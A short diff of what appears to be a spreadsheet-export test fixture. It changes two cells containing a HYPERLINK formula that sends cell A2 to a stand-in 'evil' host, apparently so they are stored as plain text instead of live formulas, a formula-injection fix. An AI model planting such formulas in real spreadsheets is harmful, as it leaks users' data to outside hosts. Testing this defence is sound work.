@@ -57,7 +57,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice16@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00020'",
@@ -121,7 +121,7 @@
     "b:True",
     "s:'Alice'",
     "s:'alice28@example.com'",
-    "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    "s:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
    ],
    [
     "s:'PR-00032'",
